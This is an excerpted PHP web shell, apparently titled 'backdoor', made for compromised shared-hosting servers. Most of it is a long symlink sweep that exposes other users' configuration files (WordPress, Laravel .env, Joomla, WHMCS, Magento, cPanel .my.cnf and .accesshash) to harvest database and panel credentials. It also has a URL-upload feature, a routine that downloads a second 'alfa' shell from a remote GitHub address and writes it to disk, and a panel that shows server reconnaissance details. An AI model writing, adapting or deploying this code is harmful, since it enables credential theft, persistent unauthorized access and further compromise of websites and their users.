...
<html>
<head>
    <title>MAU MASUK PENJARA SILAHKAN PAKE					</title>
    <meta charset="utf-8">
...
echo '<table class="header"><td><center>
    <div style="font-family:Bungee Outline;font-size:24px;"><a href="'.$_SERVER['SCRIPT_NAME'].'"><i class="fa-brands fa-napster"></i> backdoor</a></center></div></td><td><div class="container" id="tools">
                        ...
                        <a data-bs-toggle="collapse" href="#uploadUrlCollapse" role="button" aria-expanded="false" aria-controls="uploadUrlCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-link"></i> Upload from URL</a><center>';
...
@symlink('/home/' . $user . '/public_html/vb/includes/config.php', $user . '-vBulletin1.txt');
            ...
            @symlink('/home/' . $user . '/public_html/config.inc.php', $user . '-ojs.txt');
@symlink('/home/' . $user . '/public_html/ojs/config.inc.php', $user . '-ojs.txt');
@symlink('/home/' . $user . '/public_html/../backup/wp-config.php', $user . '-ojs.txt');
            @symlink('/home/' . $user . '/htdocs/wp-config.php', $user . '-Wp-htdocs.txt');
@symlink('/home/' . $user . '/var/www/htdocs/wp-config.php', $user . '-Wp-htdocs.txt');
@symlink('/home/' . $user . '/var/client/wp-config.php', $user . '-Wp-htdocs.txt');
...
@symlink('/home2/' . $user . '/public_html/vb/includes/config.php', $user . '-vBulletin1.txt');
            @symlink('/home2/' . $user . '/public_html/forum/includes/config.php', $user . '-vBulletin3.txt');
            @symlink('/home2/' . $user . '/public_html/cc/includes/config.php', $user . '-vBulletin4.txt');
            @symlink('/home2/' . $user . '/public_html/config.php', $user . '-Phpbb1.txt');
            @symlink('/home2/' . $user . '/public_html/config.inc.php', $user . '-ojs.txt');
@symlink('/home2/' . $user . '/public_html/ojs/config.inc.php', $user . '-ojs.txt');
@symlink('/home2/' . $user . '/public_html/../backup/wp-config.php', $user . '-ojs.txt');
            @symlink('/home2/' . $user . '/htdocs/wp-config.php', $user . '-Wp-htdocs.txt');
@symlink('/home2/' . $user . '/var/www/htdocs/wp-config.php', $user . '-Wp-htdocs.txt');
@symlink('/home2/' . $user . '/var/client/wp-config.php', $user . '-Wp-htdocs.txt');

            @symlink('/home2/' . $user . '/public_html/blog/wp-config.php', $user . '-Wp2.txt');
            @symlink('/home2/' . $user . '/public_html/web/wp-config.php', $user . '-Wp3.txt');
            @symlink('/home21/' . $user . '/public_html/wp-config.php', $user . '-WpHm1.txt');
            @symlink('/home22/' . $user . '/public_html/wp-config.php', $user . '-WpHm2.txt');
            @symlink('/home23/' . $user . '/public_html/wp-config.php', $user . '-WpHm3.txt');
            @symlink('/var/www/html/wp-config.php', $v . '-wp1.txt');
            @symlink('/home2/' . $user . '/public_html/.env', $user . '-Laravel1.txt');
            @symlink('/home2/' . $user . '/public_html/web/.env', $user . '-Laravel2.txt');
            @symlink('/home2/' . $user . '/public_html/public/.env', $user . '-Laravel3.txt');
            @symlink('/var/www/html/.env', $v . '-LaravelV.txt');
            @symlink('/home2/' . $user . '/public_html/configuration.php', $user . '-Joomla1.txt');
            @symlink('/home2/' . $user . '/public_html/html/configuration.php', $user . '-Joomla2.txt');
            @symlink('/home2/' . $user . '/public_html/web/configuration.php', $user . '-Joomla3.txt');
            @symlink('/home2/' . $user . '/public_html/whm/configuration.php', $user . '-Whm1.txt');
            @symlink('/home2/' . $user . '/public_html/whmc/configuration.php', $user . '-Whm2.txt');
            @symlink('/home2/' . $user . '/public_html/support/configuration.php', $user . '-Whm3.txt');
            @symlink('/home2/' . $user . '/public_html/client/configuration.php', $user . '-Whm4.txt');
            @symlink('/home2/' . $user . '/public_html/billings/configuration.php', $user . '-Whm5.txt');
            @symlink('/home2/' . $user . '/public_html/billing/configuration.php', $user . '-Whm6.txt');
            @symlink('/home2/' . $user . '/public_html/clients/configuration.php', $user . '-Whm7.txt');
            @symlink('/home2/' . $user . '/public_html/whmcs/configuration.php', $user . '-Whm8.txt');
            @symlink('/home2/' . $user . '/public_html/order/configuration.php', $user . '-Whm9.txt');
            @symlink('/home2/' . $user . '/public_html/app/etc/local.xml', $user . '-Magento.txt');
            @symlink('/home2/' . $user . '/public_html/configuration.php', $user . '-Joomla.txt');
            @symlink('/home2/' . $user . '/public_html/application/config/database.php', $user . '-CodeIgniter.txt');
            @symlink('/home2/' . $user . '/public_html/web/application/config/database.php', $user . '-CodeIgniterH.txt');
            @symlink('/home21/' . $user . '/public_html/application/config/database.php', $user . '-CodeIgniter1.txt');
            @symlink('/home22/' . $user . '/public_html/application/config/database.php', $user . '-CodeIgniter2.txt');
            @symlink('/home23/' . $user . '/public_html/application/config/database.php', $user . '-CodeIgniter3.txt');
            @symlink('/home2/' . $user . '/.my.cnf', $user . '-cpanel.txt');
            @symlink('/home2/' . $user . '/.accesshash', $user . '-whm.txt');
            @symlink('/home2/' . $user . '/public_html/admin/config.php', $user . '-opencart.txt');
            @symlink('/home2/' . $user . '/public_html/app/etc/local.xml', $user . '-mangento.txt');
@symlink('/var/www/vhost/' . $user . '/public_html/vb/includes/config.php', $user . '-vBulletin1.txt');
            @symlink('/var/www/vhost/' . $user . '/public_html/forum/includes/config.php', $user . '-vBulletin3.txt');
            @symlink('/var/www/vhost/' . $user . '/public_html/cc/includes/config.php', $user . '-vBulletin4.txt');
            @symlink('/var/www/vhost/' . $user . '/public_html/config.php', $user . '-Phpbb1.txt');
            @symlink('/var/www/vhost/' . $user . '/public_html/config.inc.php', $user . '-ojs.txt');
@symlink('/var/www/vhost/' . $user . '/public_html/ojs/config.inc.php', $user . '-ojs.txt');
@symlink('/var/www/vhost/' . $user . '/public_html/../backup/wp-config.php', $user . '-ojs.txt');
            @symlink('/var/www/vhost/' . $user . '/htdocs/wp-config.php', $user . '-Wp-htdocs.txt');
@symlink('/var/www/vhost/' . $user . '/var/www/htdocs/wp-config.php', $user . '-Wp-htdocs.txt');
@symlink('/var/www/vhost/' . $user . '/var/client/wp-config.php', $user . '-Wp-htdocs.txt');

            @symlink('/var/www/vhost/' . $user . '/public_html/blog/wp-config.php', $user . '-Wp2.txt');
            @symlink('/var/www/vhost/' . $user . '/public_html/web/wp-config.php', $user . '-Wp3.txt');
            @symlink('/var/www/vhost1/' . $user . '/public_html/wp-config.php', $user . '-WpHm1.txt');
            @symlink('/var/www/vhost2/' . $user . '/public_html/wp-config.php', $user . '-WpHm2.txt');
            @symlink('/var/www/vhost3/' . $user . '/public_html/wp-config.php', $user . '-WpHm3.txt');
            @symlink('/var/www/html/wp-config.php', $v . '-wp1.txt');
            @symlink('/var/www/vhost/' . $user . '/public_html/.env', $user . '-Laravel1.txt');
            @symlink('/var/www/vhost/' . $user . '/public_html/web/.env', $user . '-Laravel2.txt');
            @symlink('/var/www/vhost/' . $user . '/public_html/public/.env', $user . '-Laravel3.txt');
            @symlink('/var/www/html/.env', $v . '-LaravelV.txt');
            @symlink('/var/www/vhost/' . $user . '/public_html/configuration.php', $user . '-Joomla1.txt');
            @symlink('/var/www/vhost/' . $user . '/public_html/html/configuration.php', $user . '-Joomla2.txt');
            @symlink('/var/www/vhost/' . $user . '/public_html/web/configuration.php', $user . '-Joomla3.txt');
            @symlink('/var/www/vhost/' . $user . '/public_html/whm/configuration.php', $user . '-Whm1.txt');
            @symlink('/var/www/vhost/' . $user . '/public_html/whmc/configuration.php', $user . '-Whm2.txt');
            @symlink('/var/www/vhost/' . $user . '/public_html/support/configuration.php', $user . '-Whm3.txt');
            @symlink('/var/www/vhost/' . $user . '/public_html/client/configuration.php', $user . '-Whm4.txt');
            @symlink('/var/www/vhost/' . $user . '/public_html/billings/configuration.php', $user . '-Whm5.txt');
            @symlink('/var/www/vhost/' . $user . '/public_html/billing/configuration.php', $user . '-Whm6.txt');
            @symlink('/var/www/vhost/' . $user . '/public_html/clients/configuration.php', $user . '-Whm7.txt');
            @symlink('/var/www/vhost/' . $user . '/public_html/whmcs/configuration.php', $user . '-Whm8.txt');
            @symlink('/var/www/vhost/' . $user . '/public_html/order/configuration.php', $user . '-Whm9.txt');
            @symlink('/var/www/vhost/' . $user . '/public_html/app/etc/local.xml', $user . '-Magento.txt');
            @symlink('/var/www/vhost/' . $user . '/public_html/configuration.php', $user . '-Joomla.txt');
            @symlink('/var/www/vhost/' . $user . '/public_html/application/config/database.php', $user . '-CodeIgniter.txt');
            @symlink('/var/www/vhost/' . $user . '/public_html/web/application/config/database.php', $user . '-CodeIgniterH.txt');
            @symlink('/var/www/vhost1/' . $user . '/public_html/application/config/database.php', $user . '-CodeIgniter1.txt');
            @symlink('/var/www/vhost2/' . $user . '/public_html/application/config/database.php', $user . '-CodeIgniter2.txt');
            @symlink('/var/www/vhost3/' . $user . '/public_html/application/config/database.php', $user . '-CodeIgniter3.txt');
            @symlink('/var/www/vhost/' . $user . '/.my.cnf', $user . '-cpanel.txt');
            @symlink('/var/www/vhost/' . $user . '/.accesshash', $user . '-whm.txt');
            @symlink('/var/www/vhost/' . $user . '/public_html/admin/config.php', $user . '-opencart.txt');
            @symlink('/var/www/vhost/' . $user . '/public_html/app/etc/local.xml', $user . '-mangento.txt');
@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-vBulletin1.txt');
...
echo "<font color='aqua'>Scan Completed..!!</font></td></table><br>";
    ...
    function crot($url){
        ...
        echo "<table class='directory-listing-table'><td><h5><i class='fa fa-database' aria-hidden='true'></i> alfa<font class='backdoor-text' style='font-size:12px;'><i> shell pass kem</i></font></h5><hr><center>
    <form method='POST'>
    <div class='input-group' style='width:300px;'>
    <span class='input-group-text mb-2'>Filename :</span>
    <input type='text' placeholder='backup.php' class='form-control mb-2' name='miner'></div><br>
    ...
    $content = crot('https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/gafa.php');
    $open = fopen($check, 'w');
    fwrite($open, $content);
    fclose($open);
    if (file_exists($check)) {
        ...
        echo "<table class='directory-listing-table' style='border-color:red;'><td><font color='red'><center><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to create ..!!</center></font></td></table>";
                    }
                }
        }exit();
    ...
    echo "Server : <font color=limo>".$_SERVER['HTTP_HOST']."</font><br>";
    echo "Server IP : <font color=limo>".ipserv()."</font> &nbsp;<br> Your IP : <font color=limo>".$_SERVER['REMOTE_ADDR']."</font><br>";
    echo "Web Server : <font color='limo'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
    echo "System : <font color='limo'>".php_uname()."</font><br>";
    echo "User : <font color='limo'>".@get_current_user()."&nbsp;</font>( <font color='limo'>".@getmyuid()."</font>)<br>";
...
echo '<table class="table table-dark table-hover" style="box-shadow: 0 0 15px black;width:90%;border-left:2px solid #40BECC;border-right:1px solid #40BECC;border-bottom:1px solid #40BECC;--bs-border-radius:80rem;" align="center">
